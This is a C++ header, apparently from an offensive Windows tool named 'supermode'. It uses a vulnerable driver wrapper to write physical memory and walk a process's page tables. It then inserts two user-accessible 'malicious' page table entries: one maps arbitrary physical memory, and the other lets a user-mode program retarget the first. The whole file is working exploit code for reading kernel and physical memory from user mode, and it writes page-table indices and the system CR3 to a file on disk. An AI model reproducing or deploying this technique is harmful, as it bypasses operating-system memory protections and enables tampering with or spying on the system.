#pragma once
#include "drv.h"
#include <iostream>
#include <unordered_map>
#include "json.hpp"

namespace supermode
{
	typedef struct _PML4E
	{
		union
		{
			struct
			{
				ULONG64 Present : 1;              // Must be 1, region invalid if 0.
				ULONG64 ReadWrite : 1;            // If 0, writes not allowed.
				ULONG64 UserSupervisor : 1;       // If 0, user-mode accesses not allowed.
				ULONG64 PageWriteThrough : 1;     // Determines the memory type used to access PDPT.
				ULONG64 PageCacheDisable : 1;     // Determines the memory type used to access PDPT.
				ULONG64 Accessed : 1;             // If 0, this entry has not been used for translation.
				ULONG64 Ignored1 : 1;
				ULONG64 PageSize : 1;             // Must be 0 for PML4E.
				ULONG64 Ignored2 : 4;
				ULONG64 PageFrameNumber : 36;     // The page frame number of the PDPT of this PML4E.
				ULONG64 Reserved : 4;
				ULONG64 Ignored3 : 11;
				ULONG64 ExecuteDisable : 1;       // If 1, instruction fetches not allowed.
			};
			ULONG64 Value;
		};
	} PML4E, * PPML4E;

	typedef struct _PDPTE
	{
		union
		{
			struct
			{
				ULONG64 Present : 1;              // Must be 1, region invalid if 0.
				ULONG64 ReadWrite : 1;            // If 0, writes not allowed.
				ULONG64 UserSupervisor : 1;       // If 0, user-mode accesses not allowed.
				ULONG64 PageWriteThrough : 1;     // Determines the memory type used to access PD.
				ULONG64 PageCacheDisable : 1;     // Determines the memory type used to access PD.
				ULONG64 Accessed : 1;             // If 0, this entry has not been used for translation.
				ULONG64 Ignored1 : 1;
				ULONG64 PageSize : 1;             // If 1, this entry maps a 1GB page.
				ULONG64 Ignored2 : 4;
				ULONG64 PageFrameNumber : 36;     // The page frame number of the PD of this PDPTE.
				ULONG64 Reserved : 4;
				ULONG64 Ignored3 : 11;
				ULONG64 ExecuteDisable : 1;       // If 1, instruction fetches not allowed.
			};
			ULONG64 Value;
		};
	} PDPTE, * PPDPTE;

	typedef struct _PDE
	{
		union
		{
			struct
			{
				ULONG64 Present : 1;              // Must be 1, region invalid if 0.
				ULONG64 ReadWrite : 1;            // If 0, writes not allowed.
				ULONG64 UserSupervisor : 1;       // If 0, user-mode accesses not allowed.
				ULONG64 PageWriteThrough : 1;     // Determines the memory type used to access PT.
				ULONG64 PageCacheDisable : 1;     // Determines the memory type used to access PT.
				ULONG64 Accessed : 1;             // If 0, this entry has not been used for translation.
				ULONG64 Ignored1 : 1;
				ULONG64 PageSize : 1;             // If 1, this entry maps a 2MB page.
				ULONG64 Ignored2 : 4;
				ULONG64 PageFrameNumber : 36;     // The page frame number of the PT of this PDE.
				ULONG64 Reserved : 4;
				ULONG64 Ignored3 : 11;
				ULONG64 ExecuteDisable : 1;       // If 1, instruction fetches not allowed.
			};
			ULONG64 Value;
		};
	} PDE, * PPDE;

	typedef struct _PTE
	{
		union
		{
			struct
			{
				ULONG64 Present : 1;              // Must be 1, region invalid if 0.
				ULONG64 ReadWrite : 1;            // If 0, writes not allowed.
				ULONG64 UserSupervisor : 1;       // If 0, user-mode accesses not allowed.
				ULONG64 PageWriteThrough : 1;     // Determines the memory type used to access the memory.
				ULONG64 PageCacheDisable : 1;     // Determines the memory type used to access the memory.
				ULONG64 Accessed : 1;             // If 0, this entry has not been used for translation.
				ULONG64 Dirty : 1;                // If 0, the memory backing this page has not been written to.
				ULONG64 PageAccessType : 1;       // Determines the memory type used to access the memory.
				ULONG64 Global : 1;                // If 1 and the PGE bit of CR4 is set, translations are global.
				ULONG64 Ignored2 : 3;
				ULONG64 PageFrameNumber : 36;     // The page frame number of the backing physical page.
				ULONG64 Reserved : 4;
				ULONG64 Ignored3 : 7;
				ULONG64 ProtectionKey : 4;         // If the PKE bit of CR4 is set, determines the protection key.
				ULONG64 ExecuteDisable : 1;       // If 1, instruction fetches not allowed.
			};
			ULONG64 Value;
		};
	} PTE, * PPTE;

	enum PAGING_STAGE
	{
		PML4,
		PDPT,
		PD,
		PT
	};

	wnbios_lib wnbios;
	uint64_t mal_pointer_pte_ind[4];
	uint64_t mal_pte_ind[4];

	uint64_t mal_pointer_pte_struct[3];
	uint64_t mal_pte_struct[3];

	struct PTE_PFN
	{
		uint64_t pfn;
		uint64_t offset;
	};
	PTE_PFN mal_pte_pfn;

	void valid_pml4e(uint64_t* pml4ind, uint64_t* pdptstruct)
	{
		if (!wnbios.attached_proc || !wnbios.cr3)
		{
			std::cout << "Not attached to process aborting...\n";
			return;
		}

		// find a valid entry
		for (int i = 1; i < 512; i++)
		{
			PML4E pml4e;
			if (!wnbios.read_physical_memory((wnbios.cr3 + i * sizeof(uintptr_t)), &pml4e, sizeof(PML4E)))
			{
				std::cout << "Read failed\n";
				return;
			}

			// page backs physical memory
			if (pml4e.Present && pml4e.UserSupervisor)
			{
				std::cout << "Valid pml4 found at index " << i << std::endl;
				*pml4ind = i;
				*pdptstruct = pml4e.PageFrameNumber * 0x1000;
				return;
			}
		}
	}

	void valid_pdpte(uint64_t pdptstruct, uint64_t* pdpteind, uint64_t* pdstruct)
	{
		if (!wnbios.attached_proc || !wnbios.cr3)
		{
			std::cout << "Not attached to process aborting...\n";
			return;
		}

		// find a valid entry
		for (int i = 0; i < 512; i++)
		{
			PDPTE pdpte;
			if (!wnbios.read_physical_memory((pdptstruct + i * sizeof(uintptr_t)), &pdpte, sizeof(PDPTE)))
			{
				std::cout << "Read failed\n";
				return;
			}

			// page backs physical memory
			if (pdpte.Present && pdpte.UserSupervisor)
			{
				std::cout << "Valid pdpte found at index " << i << std::endl;
				*pdpteind = i;
				*pdstruct = pdpte.PageFrameNumber * 0x1000;
				return;
			}
		}
	}

	void valid_pde(uint64_t pdstruct, uint64_t* pdind, uint64_t* ptstruct)
	{
		if (!wnbios.attached_proc || !wnbios.cr3)
		{
			std::cout << "Not attached to process aborting...\n";
			return;
		}

		// find a valid entry
		for (int i = 0; i < 512; i++)
		{
			PDE pde;
			if (!wnbios.read_physical_memory((pdstruct + i * sizeof(uintptr_t)), &pde, sizeof(PDE)))
			{
				std::cout << "Read failed\n";
				return;
			}

			// page backs physical memory
			if (pde.Present && pde.UserSupervisor)
			{
				std::cout << "Valid pde found at index " << i << std::endl;
				*pdind = i;
				*ptstruct = pde.PageFrameNumber * 0x1000;
				return;
			}
		}
	}

	void free_pte(uint64_t ptstruct, uint64_t* ptind)
	{
		if (!wnbios.attached_proc || !wnbios.cr3)
		{
			std::cout << "Not attached to process aborting...\n";
			return;
		}

		// find a valid entry
		for (int i = 0; i < 512; i++)
		{
			PTE pte;
			if (!wnbios.read_physical_memory((ptstruct + i * sizeof(uintptr_t)), &pte, sizeof(PTE)))
			{
				std::cout << "Read failed\n";
				return;
			}

			if (!pte.Present)
			{
				std::cout << "Free pte found at index " << i << std::endl;
				*ptind = i;
				return;
			}
		}
	}

	/*
		Plan:
		Insert malicious PDPTE into free spot
		Insert 2nd malicious PDPTE into another free spot pointing at first malicious PDPTE so we can modify it
	*/

	PTE_PFN calc_pfnpte_from_addr(uint64_t addr)
	{
		PTE_PFN pte_pfn;
		uint64_t pfn = addr >> 12;
		pte_pfn.pfn = pfn;
		pte_pfn.offset = addr - (pfn * 0x1000);
		return pte_pfn;
	}

	uint64_t generate_virtual_address(uint64_t pml4, uint64_t pdpt, uint64_t pd, uint64_t pt, uint64_t offset)
	{
		uint64_t virtual_address =
			(pml4 << 39) |
			(pdpt << 30) |
			(pd << 21) |
			(pt << 12) |
			offset;

		return virtual_address;
	}

	void change_mal_pt_pfn(uint64_t pfn)
	{
		PTE mal_pte;
		mal_pte.Present = 1;
		mal_pte.ReadWrite = 1;
		mal_pte.UserSupervisor = 1;
		mal_pte.PageFrameNumber = pfn;
		mal_pte.ExecuteDisable = 1;
		mal_pte.Dirty = 1;
		mal_pte.Accessed = 1;

		uint64_t va = generate_virtual_address(mal_pointer_pte_ind[PML4], mal_pointer_pte_ind[PDPT], mal_pointer_pte_ind[PD], mal_pointer_pte_ind[PT], 0);
		memcpy((void*)va, &mal_pte, sizeof(PTE));
	}

	void read_physical_memory(uint64_t addr, uint64_t size, uint64_t* buf)
	{
		PTE_PFN pfn = calc_pfnpte_from_addr(addr);
		change_mal_pt_pfn(pfn.pfn);

		uint64_t va = generate_virtual_address(mal_pte_ind[PML4], mal_pte_ind[PDPT], mal_pte_ind[PD], mal_pte_ind[PT], pfn.offset);
		memcpy((void*)buf, (void*)va, size);
	}

	// this pte will point to physical mem
	void insert_first_malicious_pte()
	{
		// find a free pte and populate other indices while at it
		valid_pml4e(&mal_pte_ind[PML4], &mal_pte_struct[PDPT]);
		valid_pdpte(mal_pte_struct[PDPT], &mal_pte_ind[PDPT], &mal_pte_struct[PD]);
		valid_pde(mal_pte_struct[PD], &mal_pte_ind[PD], &mal_pte_struct[PT]);
		free_pte(mal_pte_struct[PT], &mal_pte_ind[PT]);

		std::cout << "PML4: " << mal_pte_ind[PML4] << std::endl
			<< "PDPT: " << mal_pte_ind[PDPT] << std::endl
			<< "PD: " << mal_pte_ind[PD] << std::endl
			<< "PT: " << mal_pte_ind[PT] << std::endl;

		PTE mal_pte;
		mal_pte.Present = 1;
		mal_pte.ReadWrite = 1;
		mal_pte.UserSupervisor = 1;
		mal_pte.PageFrameNumber = 0;
		mal_pte.ExecuteDisable = 1;
		mal_pte.Dirty = 1;
		mal_pte.Accessed = 1;

		uintptr_t mal_pte_phys = mal_pte_struct[PT] + mal_pte_ind[PT] * sizeof(uintptr_t);
		mal_pte_pfn = calc_pfnpte_from_addr(mal_pte_phys);

		wnbios.write_physical_memory(mal_pte_phys, &mal_pte, sizeof(PTE));
		std::cout << "inserted first malicious pte at index " << mal_pte_ind[PT] << " [" << std::hex << mal_pte_phys << "] " << std::dec << std::endl;
	}

	// this pte will point to our other malicious pte we can modify from our UM program then
	void insert_second_malicious_pte()
	{
		// find a free pte and populate other indices while at it
		valid_pml4e(&mal_pointer_pte_ind[PML4], &mal_pointer_pte_struct[PDPT]);
		valid_pdpte(mal_pointer_pte_struct[PDPT], &mal_pointer_pte_ind[PDPT], &mal_pointer_pte_struct[PD]);
		valid_pde(mal_pointer_pte_struct[PD], &mal_pointer_pte_ind[PD], &mal_pointer_pte_struct[PT]);
		free_pte(mal_pointer_pte_struct[PT], &mal_pointer_pte_ind[PT]);

		std::cout << "PML4: " << mal_pointer_pte_ind[PML4] << std::endl
			<< "PDPT: " << mal_pointer_pte_ind[PDPT] << std::endl
			<< "PD: " << mal_pointer_pte_ind[PD] << std::endl
			<< "PT: " << mal_pointer_pte_ind[PT] << std::endl;

		PTE mal_pte;
		mal_pte.Present = 1;
		mal_pte.ReadWrite = 1;
		mal_pte.UserSupervisor = 1;
		mal_pte.PageFrameNumber = mal_pte_pfn.pfn;
		mal_pte.ExecuteDisable = 1;
		mal_pte.Dirty = 1;
		mal_pte.Accessed = 1;
		
		uintptr_t mal_pte_phys = mal_pointer_pte_struct[PT] + mal_pointer_pte_ind[PT] * sizeof(uintptr_t);
		
		wnbios.write_physical_memory(mal_pte_phys, &mal_pte, sizeof(PTE));
		std::cout << "inserted second malicious pdpt at index " << mal_pointer_pte_ind[PT] << " [" << std::hex << mal_pte_phys << "] " << std::dec << " pointing to pfn " << mal_pte_pfn.pfn << std::endl;
	}

	// goofy ahh
	void save_indices_for_target()
	{
		nlohmann::json j;
		j["mal_pte_indices"] = {};
		j["mal_pointer_pte_indices"] = {};

		for (int i = 0; i <= PT; i++)
		{
			j["mal_pte_indices"][std::to_string(i)] = mal_pte_ind[i];
			j["mal_pointer_pte_indices"][std::to_string(i)] = mal_pointer_pte_ind[i];
		}

		j["cr3"] = wnbios.get_system_dirbase();

		std::ofstream out_file("C:\\indices.json");
		out_file << j.dump();
	}
}